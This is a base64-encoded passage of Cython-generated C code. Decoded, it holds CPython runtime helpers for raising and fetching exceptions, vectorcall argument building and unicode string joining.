7CiAgICAqdmFsdWUgPSBsb2NhbF92YWx1ZTsKICAgICp0YiA9IGxvY2FsX3RiOwojaWYgQ1lUSE9OX0ZBU1RfVEhSRUFEX1NUQVRFCiAgICAjaWYgQ1lUSE9OX1VTRV9FWENfSU5GT19TVEFDSwogICAgewogICAgICAgIF9QeUVycl9TdGFja0l0ZW0gKmV4Y19pbmZvID0gdHN0YXRlLT5leGNfaW5mbzsKICAgICAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQjAwYTQKICAgICAgICB0bXBfdmFsdWUgPSBleGNfaW5mby0+ZXhjX3ZhbHVlOwogICAgICAgIGV4Y19pbmZvLT5leGNfdmFsdWUgPSBsb2NhbF92YWx1ZTsKICAgICAgICB0bXBfdHlwZSA9IE5VTEw7CiAgICAgICAgdG1wX3RiID0gTlVMTDsKICAgICAgICBQeV9YREVDUkVGKGxvY2FsX3R5cGUpOwogICAgICAgIFB5X1hERUNSRUYobG9jYWxfdGIpOwogICAgICAjZWxzZQogICAgICAgIHRtcF90eXBlID0gZXhjX2luZm8tPmV4Y190eXBlOwogICAgICAgIHRtcF92YWx1ZSA9IGV4Y19pbmZvLT5leGNfdmFsdWU7CiAgICAgICAgdG1wX3RiID0gZXhjX2luZm8tPmV4Y190cmFjZWJhY2s7CiAgICAgICAgZXhjX2luZm8tPmV4Y190eXBlID0gbG9jYWxfdHlwZTsKICAgICAgICBleGNfaW5mby0+ZXhjX3ZhbHVlID0gbG9jYWxfdmFsdWU7CiAgICAgICAgZXhjX2luZm8tPmV4Y190cmFjZWJhY2sgPSBsb2NhbF90YjsKICAgICAgI2VuZGlmCiAgICB9CiAgICAjZWxzZQogICAgdG1wX3R5cGUgPSB0c3RhdGUtPmV4Y190eXBlOwogICAgdG1wX3ZhbHVlID0gdHN0YXRlLT5leGNfdmFsdWU7CiAgICB0bXBfdGIgPSB0c3RhdGUtPmV4Y190cmFjZWJhY2s7CiAgICB0c3RhdGUtPmV4Y190eXBlID0gbG9jYWxfdHlwZTsKICAgIHRzdGF0ZS0+ZXhjX3ZhbHVlID0gbG9jYWxfdmFsdWU7CiAgICB0c3RhdGUtPmV4Y190cmFjZWJhY2sgPSBsb2NhbF90YjsKICAgICNlbmRpZgogICAgUHlfWERFQ1JFRih0bXBfdHlwZSk7CiAgICBQeV9YREVDUkVGKHRtcF92YWx1ZSk7CiAgICBQeV9YREVDUkVGKHRtcF90Yik7CiNlbGlmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPj0gMHgwMzBiMDAwMAogICAgUHlFcnJfU2V0SGFuZGxlZEV4Y2VwdGlvbihsb2NhbF92YWx1ZSk7CiAgICBQeV9YREVDUkVGKGxvY2FsX3ZhbHVlKTsKICAgIFB5X1hERUNSRUYobG9jYWxfdHlwZSk7CiAgICBQeV9YREVDUkVGKGxvY2FsX3RiKTsKI2Vsc2UKICAgIFB5RXJyX1NldEV4Y0luZm8obG9jYWxfdHlwZSwgbG9jYWxfdmFsdWUsIGxvY2FsX3RiKTsKI2VuZGlmCiAgICByZXR1cm4gMDsKI2lmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPD0gMHgwMzBDMDAwMApiYWQ6CiAgICAqdHlwZSA9IDA7CiAgICAqdmFsdWUgPSAwOwogICAgKnRiID0gMDsKICAgIFB5X1hERUNSRUYobG9jYWxfdHlwZSk7CiAgICBQeV9YREVDUkVGKGxvY2FsX3ZhbHVlKTsKICAgIFB5X1hERUNSRUYobG9jYWxfdGIpOwogICAgcmV0dXJuIC0xOwojZW5kaWYKfQoKCnN0YXRpYyB2b2lkIF9fUHl4X1JhaXNlVW5ib3VuZExvY2FsRXJyb3IoY29uc3QgY2hhciAqdmFybmFtZSkgewogICAgUHlFcnJfRm9ybWF0KFB5RXhjX1VuYm91bmRMb2NhbEVycm9yLCAibG9jYWwgdmFyaWFibGUgJyVzJyByZWZlcmVuY2VkIGJlZm9yZSBhc3NpZ25tZW50IiwgdmFybmFtZSk7Cn0KCgpzdGF0aWMgdm9pZCBfX1B5eF9SYWlzZUNsb3N1cmVOYW1lRXJyb3IoY29uc3QgY2hhciAqdmFybmFtZSkgewogICAgUHlFcnJfRm9ybWF0KFB5RXhjX05hbWVFcnJvciwgImZyZWUgdmFyaWFibGUgJyVzJyByZWZlcmVuY2VkIGJlZm9yZSBhc3NpZ25tZW50IGluIGVuY2xvc2luZyBzY29wZSIsIHZhcm5hbWUpOwp9CgoKc3RhdGljIHZvaWQgX19QeXhfR2VuZXJhdG9yX1JlcGxhY2VfU3RvcEl0ZXJhdGlvbihpbnQgaW5fYXN5bmNfZ2VuKSB7CiAgICBQeU9iamVjdCAqZXhjLCAqdmFsLCAqdGIsICpjdXJfZXhjLCAqbmV3X2V4YzsKICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZQogICAgaW50IGlzX2FzeW5jX3N0b3BpdGVyYXRpb24gPSAwOwogICAgQ1lUSE9OX01BWUJFX1VOVVNFRF9WQVIoaW5fYXN5bmNfZ2VuKTsKICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfYXNzaWduCiAgICBjdXJfZXhjID0gX19QeXhfUHlFcnJfQ3VycmVudEV4Y2VwdGlvblR5cGUoKTsKICAgIGlmIChsaWtlbHkoIV9fUHl4X1B5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlcyhjdXJfZXhjLCBQeUV4Y19TdG9wSXRlcmF0aW9uKSkpIHsKICAgICAgICBpZiAoaW5fYXN5bmNfZ2VuICYmIHVubGlrZWx5KF9fUHl4X1B5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlcyhjdXJfZXhjLCBQeUV4Y19TdG9wQXN5bmNJdGVyYXRpb24pKSkgewogICAgICAgICAgICBpc19hc3luY19zdG9waXRlcmF0aW9uID0gMTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICByZXR1cm47CiAgICAgICAgfQogICAgfQogICAgX19QeXhfR2V0RXhjZXB0aW9uKCZleGMsICZ2YWwsICZ0Yik7CiAgICBQeV9YREVDUkVGKGV4Yyk7CiAgICBQeV9YREVDUkVGKHRiKTsKICAgIG5ld19leGMgPSBQeU9iamVjdF9DYWxsRnVuY3Rpb24oUHlFeGNfUnVudGltZUVycm9yLCAicyIsCiAgICAgICAgaXNfYXN5bmNfc3RvcGl0ZXJhdGlvbiA/ICJhc3luYyBnZW5lcmF0b3IgcmFpc2VkIFN0b3BBc3luY0l0ZXJhdGlvbiIgOgogICAgICAgIGluX2FzeW5jX2dlbiA/ICJhc3luYyBnZW5lcmF0b3IgcmFpc2VkIFN0b3BJdGVyYXRpb24iIDoKICAgICAgICAiZ2VuZXJhdG9yIHJhaXNlZCBTdG9wSXRlcmF0aW9uIik7CiAgICBpZiAoIW5ld19leGMpIHsKICAgICAgICBQeV9YREVDUkVGKHZhbCk7CiAgICAgICAgcmV0dXJuOwogICAgfQogICAgUHlFeGNlcHRpb25fU2V0Q2F1c2UobmV3X2V4YywgdmFsKTsgLy8gc3RlYWxzIHJlZiB0byB2YWwKICAgIFB5RXJyX1NldE9iamVjdChQeUV4Y19SdW50aW1lRXJyb3IsIG5ld19leGMpOwp9CgoKI2lmIENZVEhPTl9WRUNUT1JDQUxMCnN0YXRpYyBpbnQgX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKFB5T2JqZWN0ICprZXksIFB5T2JqZWN0ICp2YWx1ZSwgUHlPYmplY3QgKmJ1aWxkZXIsIFB5T2JqZWN0ICoqYXJncywgaW50IG4pIHsKICAgICh2b2lkKV9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsRGljdDsKICAgIGlmIChfX1B5eF9QeVR1cGxlX1NFVF9JVEVNKGJ1aWxkZXIsIG4sIGtleSkgIT0gKDApKSByZXR1cm4gLTE7CiAgICBQeV9JTkNSRUYoa2V5KTsKICAgIGFyZ3Nbbl0gPSB2YWx1ZTsKICAgIHJldHVybiAwOwp9CkNZVEhPTl9VTlVTRUQgc3RhdGljIGludCBfX1B5eF9WZWN0b3JjYWxsQnVpbGRlcl9BZGRBcmdfQ2hlY2soUHlPYmplY3QgKmtleSwgUHlPYmplY3QgKnZhbHVlLCBQeU9iamVjdCAqYnVpbGRlciwgUHlPYmplY3QgKiphcmdzLCBpbnQgbikgewogICAgKHZvaWQpX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnU3RyOwogICAgaWYgKHVubGlrZWx5KCFQeVVuaWNvZGVfQ2hlY2soa2V5KSkpIHsKICAgICAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfVHlwZUVycm9yLCAia2V5d29yZHMgbXVzdCBiZSBzdHJpbmdzIik7CiAgICAgICAgcmV0dXJuIC0xOwogICAgfQogICAgcmV0dXJuIF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZyhrZXksIHZhbHVlLCBidWlsZGVyLCBhcmdzLCBuKTsKfQpzdGF0aWMgaW50IF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZ1N0cihjb25zdCBjaGFyICprZXksIFB5T2JqZWN0ICp2YWx1ZSwgUHlPYmplY3QgKmJ1aWxkZXIsIFB5T2JqZWN0ICoqYXJncywgaW50IG4pIHsKICAgIFB5T2JqZWN0ICpweUtleSA9IFB5VW5pY29kZV9Gcm9tU3RyaW5nKGtleSk7CiAgICBpZiAoIXB5S2V5KSByZXR1cm4gLTE7CiAgICByZXR1cm4gX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKHB5S2V5LCB2YWx1ZSwgYnVpbGRlciwgYXJncywgbik7Cn0KI2Vsc2UgLy8gQ1lUSE9OX1ZFQ1RPUkNBTEwKQ1lUSE9OX1VOVVNFRCBzdGF0aWMgaW50IF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZ19DaGVjayhQeU9iamVjdCAqa2V5LCBQeU9iamVjdCAqdmFsdWUsIFB5T2JqZWN0ICpidWlsZGVyLCBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICoqYXJncywgQ1lUSE9OX1VOVVNFRCBpbnQgbikgewogICAgaWYgKHVubGlrZWx5KCFQeVVuaWNvZGVfQ2hlY2soa2V5KSkpIHsKICAgICAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfVHlwZUVycm9yLCAia2V5d29yZHMgbXVzdCBiZSBzdHJpbmdzIik7CiAgICAgICAgcmV0dXJuIC0xOwogICAgfQogICAgcmV0dXJuIFB5RGljdF9TZXRJdGVtKGJ1aWxkZXIsIGtleSwgdmFsdWUpOwp9CiNlbmRpZgoKCiNpZiAhQ1lUSE9OX1ZFQ1RPUkNBTEwgfHwgUFlfVkVSU0lPTl9IRVggPCAweDAzMDkwMDAwCnN0YXRpYyBQeU9iamVjdCAqX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoUHlPYmplY3QgKm5hbWUsIFB5T2JqZWN0ICpjb25zdCAqYXJncywgc2l6ZV90IG5hcmdzZikgewogICAgUHlPYmplY3QgKnJlc3VsdDsKICAgIFB5T2JqZWN0ICphdHRyID0gUHlPYmplY3RfR2V0QXR0cihhcmdzWzBdLCBuYW1lKTsKICAgIGlmICh1bmxpa2VseSghYXR0cikpCiAgICAgICAgcmV0dXJuIE5VTEw7CiAgICByZXN1bHQgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChhdHRyLCBhcmdzKzEsIG5hcmdzZiAtIDEpOwogICAgUHlfREVDUkVGKGF0dHIpOwogICAgcmV0dXJuIHJlc3VsdDsKfQojZW5kaWYKCgpzdGF0aWMgdm9pZCBfX1B5eF9SYWlzZShQeU9iamVjdCAqdHlwZSwgUHlPYmplY3QgKnZhbHVlLCBQeU9iamVjdCAqdGIsIFB5T2JqZWN0ICpjYXVzZSkgewogICAgUHlPYmplY3QqIG93bmVkX2luc3RhbmNlID0gTlVMTDsKICAgIGlmICh0YiA9PSBQeV9Ob25lKSB7CiAgICAgICAgdGIgPSAwOwogICAgfSBlbHNlIGlmICh0YiAmJiAhUHlUcmFjZUJhY2tfQ2hlY2sodGIpKSB7CiAgICAgICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX1R5cGVFcnJvciwKICAgICAgICAgICAgInJhaXNlOiBhcmcgMyBtdXN0IGJlIGEgdHJhY2ViYWNrIG9yIE5vbmUiKTsKICAgICAgICBnb3RvIGJhZDsKICAgIH0KICAgIGlmICh2YWx1ZSA9PSBQeV9Ob25lKQogICAgICAgIHZhbHVlID0gMDsKICAgIGlmIChQeUV4Y2VwdGlvbkluc3RhbmNlX0NoZWNrKHR5cGUpKSB7CiAgICAgICAgaWYgKHZhbHVlKSB7CiAgICAgICAgICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19UeXBlRXJyb3IsCiAgICAgICAgICAgICAgICAiaW5zdGFuY2UgZXhjZXB0aW9uIG1heSBub3QgaGF2ZSBhIHNlcGFyYXRlIHZhbHVlIik7CiAgICAgICAgICAgIGdvdG8gYmFkOwogICAgICAgIH0KICAgICAgICB2YWx1ZSA9IHR5cGU7CiAgICAgICAgdHlwZSA9IChQeU9iamVjdCopIFB5X1RZUEUodmFsdWUpOwogICAgfSBlbHNlIGlmIChQeUV4Y2VwdGlvbkNsYXNzX0NoZWNrKHR5cGUpKSB7CiAgICAgICAgUHlPYmplY3QgKmluc3RhbmNlX2NsYXNzID0gTlVMTDsKICAgICAgICBpZiAodmFsdWUgJiYgUHlFeGNlcHRpb25JbnN0YW5jZV9DaGVjayh2YWx1ZSkpIHsKICAgICAgICAgICAgaW5zdGFuY2VfY2xhc3MgPSAoUHlPYmplY3QqKSBQeV9UWVBFKHZhbHVlKTsKICAgICAgICAgICAgaWYgKGluc3RhbmNlX2NsYXNzICE9IHR5cGUpIHsKICAgICAgICAgICAgICAgIGludCBpc19zdWJjbGFzcyA9IFB5T2JqZWN0X0lzU3ViY2xhc3MoaW5zdGFuY2VfY2xhc3MsIHR5cGUpOwogICAgICAgICAgICAgICAgaWYgKCFpc19zdWJjbGFzcykgewogICAgICAgICAgICAgICAgICAgIGluc3RhbmNlX2NsYXNzID0gTlVMTDsKICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAodW5saWtlbHkoaXNfc3ViY2xhc3MgPT0gLTEpKSB7CiAgICAgICAgICAgICAgICAgICAgZ290byBiYWQ7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIHR5cGUgPSBpbnN0YW5jZV9jbGFzczsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBpZiAoIWluc3RhbmNlX2NsYXNzKSB7CiAgICAgICAgICAgIFB5T2JqZWN0ICphcmdzOwogICAgICAgICAgICBpZiAoIXZhbHVlKQogICAgICAgICAgICAgICAgYXJncyA9IFB5VHVwbGVfTmV3KDApOwogICAgICAgICAgICBlbHNlIGlmIChQeVR1cGxlX0NoZWNrKHZhbHVlKSkgewogICAgICAgICAgICAgICAgUHlfSU5DUkVGKHZhbHVlKTsKICAgICAgICAgICAgICAgIGFyZ3MgPSB2YWx1ZTsKICAgICAgICAgICAgfSBlbHNlCiAgICAgICAgICAgICAgICBhcmdzID0gUHlUdXBsZV9QYWNrKDEsIHZhbHVlKTsKICAgICAgICAgICAgaWYgKCFhcmdzKQogICAgICAgICAgICAgICAgZ290byBiYWQ7CiAgICAgICAgICAgIG93bmVkX2luc3RhbmNlID0gUHlPYmplY3RfQ2FsbCh0eXBlLCBhcmdzLCBOVUxMKTsKICAgICAgICAgICAgUHlfREVDUkVGKGFyZ3MpOwogICAgICAgICAgICBpZiAoIW93bmVkX2luc3RhbmNlKQogICAgICAgICAgICAgICAgZ290byBiYWQ7CiAgICAgICAgICAgIHZhbHVlID0gb3duZWRfaW5zdGFuY2U7CiAgICAgICAgICAgIGlmICghUHlFeGNlcHRpb25JbnN0YW5jZV9DaGVjayh2YWx1ZSkpIHsKICAgICAgICAgICAgICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19UeXBlRXJyb3IsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgImNhbGxpbmcgJVIgc2hvdWxkIGhhdmUgcmV0dXJuZWQgYW4gaW5zdGFuY2Ugb2YgIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICJCYXNlRXhjZXB0aW9uLCBub3QgJVIiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgIHR5cGUsIFB5X1RZUEUodmFsdWUpKTsKICAgICAgICAgICAgICAgIGdvdG8gYmFkOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfSBlbHNlIHsKICAgICAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfVHlwZUVycm9yLAogICAgICAgICAgICAicmFpc2U6IGV4Y2VwdGlvbiBjbGFzcyBtdXN0IGJlIGEgc3ViY2xhc3Mgb2YgQmFzZUV4Y2VwdGlvbiIpOwogICAgICAgIGdvdG8gYmFkOwogICAgfQogICAgaWYgKGNhdXNlKSB7CiAgICAgICAgUHlPYmplY3QgKmZpeGVkX2NhdXNlOwogICAgICAgIGlmIChjYXVzZSA9PSBQeV9Ob25lKSB7CiAgICAgICAgICAgIGZpeGVkX2NhdXNlID0gTlVMTDsKICAgICAgICB9IGVsc2UgaWYgKFB5RXhjZXB0aW9uQ2xhc3NfQ2hlY2soY2F1c2UpKSB7CiAgICAgICAgICAgIGZpeGVkX2NhdXNlID0gUHlPYmplY3RfQ2FsbE9iamVjdChjYXVzZSwgTlVMTCk7CiAgICAgICAgICAgIGlmIChmaXhlZF9jYXVzZSA9PSBOVUxMKQogICAgICAgICAgICAgICAgZ290byBiYWQ7CiAgICAgICAgfSBlbHNlIGlmIChQeUV4Y2VwdGlvbkluc3RhbmNlX0NoZWNrKGNhdXNlKSkgewogICAgICAgICAgICBmaXhlZF9jYXVzZSA9IGNhdXNlOwogICAgICAgICAgICBQeV9JTkNSRUYoZml4ZWRfY2F1c2UpOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19UeXBlRXJyb3IsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiZXhjZXB0aW9uIGNhdXNlcyBtdXN0IGRlcml2ZSBmcm9tICIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICJCYXNlRXhjZXB0aW9uIik7CiAgICAgICAgICAgIGdvdG8gYmFkOwogICAgICAgIH0KICAgICAgICBQeUV4Y2VwdGlvbl9TZXRDYXVzZSh2YWx1ZSwgZml4ZWRfY2F1c2UpOwogICAgfQogICAgUHlFcnJfU2V0T2JqZWN0KHR5cGUsIHZhbHVlKTsKICAgIGlmICh0YikgewojaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBDMDBBNgogICAgICAgIFB5RXhjZXB0aW9uX1NldFRyYWNlYmFjayh2YWx1ZSwgdGIpOwojZWxpZiBDWVRIT05fRkFTVF9USFJFQURfU1RBVEUKICAgICAgICBQeVRocmVhZFN0YXRlICp0c3RhdGUgPSBfX1B5eF9QeVRocmVhZFN0YXRlX0N1cnJlbnQ7CiAgICAgICAgUHlPYmplY3QqIHRtcF90YiA9IHRzdGF0ZS0+Y3VyZXhjX3RyYWNlYmFjazsKICAgICAgICBpZiAodGIgIT0gdG1wX3RiKSB7CiAgICAgICAgICAgIFB5X0lOQ1JFRih0Yik7CiAgICAgICAgICAgIHRzdGF0ZS0+Y3VyZXhjX3RyYWNlYmFjayA9IHRiOwogICAgICAgICAgICBQeV9YREVDUkVGKHRtcF90Yik7CiAgICAgICAgfQojZWxzZQogICAgICAgIFB5T2JqZWN0ICp0bXBfdHlwZSwgKnRtcF92YWx1ZSwgKnRtcF90YjsKICAgICAgICBQeUVycl9GZXRjaCgmdG1wX3R5cGUsICZ0bXBfdmFsdWUsICZ0bXBfdGIpOwogICAgICAgIFB5X0lOQ1JFRih0Yik7CiAgICAgICAgUHlFcnJfUmVzdG9yZSh0bXBfdHlwZSwgdG1wX3ZhbHVlLCB0Yik7CiAgICAgICAgUHlfWERFQ1JFRih0bXBfdGIpOwojZW5kaWYKICAgIH0KYmFkOgogICAgUHlfWERFQ1JFRihvd25lZF9pbnN0YW5jZSk7CiAgICByZXR1cm47Cn0KCgpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlVbmljb2RlX1VuaWNvZGUoUHlPYmplY3QgKm9iaikgewogICAgaWYgKHVubGlrZWx5KG9iaiA9PSBQeV9Ob25lKSkKICAgICAgICBvYmogPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X05vbmU7CiAgICByZXR1cm4gX19QeXhfTmV3UmVmKG9iaik7Cn0KCgpzdGF0aWMgUHlPYmplY3QqIF9fUHl4X1B5VW5pY29kZV9Kb2luKFB5T2JqZWN0KiogdmFsdWVzLCBQeV9zc2l6ZV90IHZhbHVlX2NvdW50LCBQeV9zc2l6ZV90IHJlc3VsdF91bGVuZ3RoLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFB5X1VDUzQgbWF4X2NoYXIpIHsKI2lmIENZVEhPTl9VU0VfVU5JQ09ERV9JTlRFUk5BTFMgJiYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiAhQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMKICAgIFB5T2JqZWN0ICpyZXN1bHRfdXZhbDsKICAgIGludCByZXN1bHRfdWtpbmQsIGtpbmRfc2hpZnQ7CiAgICBQeV9zc2l6ZV90IGksIGNoYXJfcG9zOwogICAgdm9pZCAqcmVzdWx0X3VkYXRhOwogICAgaWYgKG1heF9jaGFyID4gMTExNDExMSkgbWF4X2NoYXIgPSAxMTE0MTExOwogICAgcmVzdWx0X3V2YWwgPSBQeVVuaWNvZGVfTmV3KHJlc3VsdF91bGVuZ3RoLCBtYXhfY2hhcik7CiAgICBpZiAodW5saWtlbHkoIXJlc3VsdF91dmFsKSkgcmV0dXJuIE5VTEw7CiAgICByZXN1bHRfdWtpbmQgPSAobWF4X2NoYXIgPD0gMjU1KSA/IFB5VW5pY29kZV8xQllURV9LSU5EIDogKG1heF9jaGFyIDw9IDY1NTM1KSA/IFB5VW5pY29kZV8yQllURV9LSU5EIDogUHlVbmljb2RlXzRCWVRFX0tJTkQ7CiAgICBraW5kX3NoaWZ0ID0gKHJlc3VsdF91a2luZCA9PSBQeVVuaWNvZGVfNEJZVEVfS0lORCkgPyAyIDogcmVzdWx0X3VraW5kIC0gMTsKICAgIHJlc3VsdF91ZGF0YSA9IFB5VW5pY29kZV9EQVRBKHJlc3VsdF91dmFsKTsKICAgIGFzc2VydChraW5kX3NoaWZ0ID09IDIgfHwga2luZF9zaGlmdCA9PSAxIHx8IGtpbmRfc2hpZnQgPT0gMCk7CiAgICBpZiAodW5saWtlbHkoKFBZX1NTSVpFX1RfTUFYID4+IGtpbmRfc2hpZnQpIC0gcmVzdWx0X3VsZW5ndGggPCAwKSkKICAgICAgICBnb3RvIG92ZXJmbG93OwogICAgY2hhcl9wb3MgPSAwOwogICAgZm9yIChpPTA7IGkgPCB2YWx1ZV9jb3VudDsgaSsrKSB7CiAgICAgICAgaW50IHVraW5kOwogICAgICAgIFB5X3NzaXplX3QgdWxlbmd0aDsKICAgICAgICB2b2lkICp1ZGF0YTsKICAgICAgICBQeU9iamVjdCAqdXZhbCA9IHZhbHVlc1tpXTsKICAgICAgICAjaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgICAgICBpZiAoX19QeXhfUHlVbmljb2RlX1JFQURZKHV2YWwpID09ICgtMSkpCiAgICAgICAgICAgIGdvdG8gYmFkOwogICAgICAgICNlbmRpZgogICAgICAgIHVsZW5ndGggPSBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSCh1dmFsKTsKICAgICAgICAjaWYgIUNZVEhPTl9BU1NVTUVfU0FGRV9TSVpFCiAgICAgICAgaWYgKHVubGlrZWx5KHVsZW5ndGggPCAwKSkgZ290byBiYWQ7CiAgICAgICAgI2VuZGlmCiAgICAgICAgaWYgKHVubGlrZWx5KCF1bGVuZ3RoKSkKICAgICAgICAgICAgY29udGludWU7CiAgICAgICAgaWYgKHVubGlrZWx5KChQWV9TU0laRV9UX01BWCA+PiBraW5kX3NoaWZ0KSAtIHVsZW5ndGggPCBjaGFyX3BvcykpCiAgICAgICAgICAgIGdvdG8gb3ZlcmZsb3c7CiAgICAgICAgdWtpbmQgPSBfX1B5eF9QeVVuaWNvZGVfS0lORCh1dmFsKTsKICAgICAgICB1ZGF0YSA9IF9fUHl4X1B5VW5pY29kZV9EQVRBKHV2YWwpOwogICAgICAgIGlmICh1a2luZCA9PSByZXN1bHRfdWtpbmQpIHsKICAgICAgICAgICAgbWVtY3B5KChjaGFyICopcmVzdWx0X3VkYXRhICsgKGNoYXJfcG9zIDw8IGtpbmRfc2hpZnQpLCB1ZGF0YSwgKHNpemVfdCkgKHVsZW5ndGggPDwga2luZF9zaGlmdCkpOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMDAwCiAgICAgICAgICAgIGlmICh1bmxpa2VseShQeVVuaWNvZGVfQ29weUNoYXJhY3RlcnMocmVzdWx0X3V2YWwsIGNoYXJfcG9zLCB1dmFsLCAwLCB1bGVuZ3RoKSA8IDApKSBnb3RvIGJhZDsKICAgICAgICAgICAgI2VsaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OIHx8IGRlZmluZWQoX1B5VW5pY29kZV9GYXN0Q29weUNoYXJhY3RlcnMpCiAgICAgICAgICAgIF9QeVVuaWNvZGVfRmFzdENvcHlDaGFyYWN0ZXJzKHJlc3VsdF91dmFsLCBjaGFyX3BvcywgdXZhbCwgMCwgdWxlbmd0aCk7CiAgICAgICAgICAgICNlbHNlCiAgICAgICAgICAgIFB5X3NzaXplX3QgajsKICAgICAgICAgICAgZm9yIChqPTA7IGogPCB1bGVuZ3RoOyBqKyspIHsKICAgICAgICAgICAgICAgIFB5X1VDUzQgdWNoYXIgPSBfX1B5eF9QeVVuaWNvZGVfUkVBRCh1a2luZCwgdWRhdGEsIGopOwogICAgICAgICAgICAgICAgX19QeXhfUHlVbmljb2RlX1dSSVRFKHJlc3VsdF91a2luZCwgcmVzdWx0X3VkYXRhLCBjaGFyX3BvcytqLCB1Y2hhcik7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgI2VuZGlmCiAgICAgICAgfQogICAgICAgIGNoYXJfcG9zICs9IHVsZW5ndGg7CiAgICB9CiAgICByZXR1cm4gcmVzdWx0X3V2YWw7Cm92ZXJmbG93OgogICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX092ZXJmbG93RXJyb3IsICJqb2luKCkgcmVzdWx0IGlzIHRvbyBsb25nIGZvciBhIFB5dGhvbiBzdHJpbmciKTsKYmFkOgogICAgUHlfREVDUkVGKHJlc3VsdF91dmFsKTsKICAgIHJldHVybiBOVUxMOwojZWxzZQogICAgUHlfc3NpemVfdCBpOwogICAgUHlPYmplY3QgKnJlc3VsdCA9IE5VTEw7CiAgICBQeU9iamVjdCAqdmFsdWVfdHVwbGUgPSBQeVR1cGxlX05ldyh2YWx1ZV9jb3VudCk7CiAgICBpZiAodW5saWtlbHkoIXZhbHVlX3R1cGxlKSkgcmV0dXJuIE5VTEw7CiAgICBDWVRIT05fVU5VU0VEX1ZBUihtYXhfY2hhcik7CiAgICBDWVRIT05fVU5VU0VEX1ZBUihyZXN1bHRfdWxlbmd0aCk7CiAgICBmb3IgKGk9MDsgaTx2YWx1ZV9jb3VudDsgaSsrKSB7CiAgICAgICAgaWYgKF9fUHl4X1B5VHVwbGVfU0VUX0lURU0odmFsdWVfdHVwbGUsIGksIHZhbHVlc1tpXSkgIT0gKDApKSBnb3RvIGJhZDsKICAgICAgICBQeV9JTkNSRUYodmFsdWVzW2ldKTsKICAgIH0KICAgIHJlc3VsdCA9IFB5VW5pY29kZV9Kb2luKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3VuaWNvZGUsIHZhbHVlX3R1cGxlKTsKYmFkOgogICAgUHlfREVDUkVGKHZhbHVlX3R1cGxlKTsKICAgIHJldHVybiByZXN1bHQ7CiNlbmRpZgp9CgoKc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X1B5TG9uZ19Cb29sTmVPYmpDKFB5T2JqZWN0ICpvcDEsIFB5T2JqZWN0ICpvcDIsIGxvbmcgaW50dmFsLCBsb25nIGlucGxhY2UpIHsKICAgIENZVEhPTl9NQVlCRV9VTlVTRURfVkFSKGludHZhbCk7CiAgICBDWVRIT05fVU5VU0VEX1ZBUihpbnBsYWNlKTsKICAgIGlmIChvcDEgPT0gb3AyKSB7CiAgICAgICAgcmV0dXJuIDA7CiAgICB9CiAgICAjaWYgQ1lUSE9OX1VTRV9QWUxPTkdfSU5URVJOQUxTCiAgICBpZiAobGlrZWx5KFB5TG9uZ19DaGVja0V4YWN0KG9wMSkpKSB7CiAgICAgICAgaW50IHVuZXF1YWw7CiAgICAgICAgdW5zaWduZWQgbG9uZyB1aW50dmFsOwogICAgICAgIFB5X3NzaXplX3Qgc2l6ZSA9IF9fUHl4X1B5TG9uZ19EaWdpdENvdW50KG9wMSk7CiAgICAgICAgY29uc3QgZGlnaXQqIGRpZ2l0cyA9IF9fUHl4X1B5TG9uZ19EaWdpdHMob3AxKTsKICAgICAgICBpZiAoaW50dmFsID09IDApIHsKICAgICAgICAgICAgcmV0dXJuIChfX1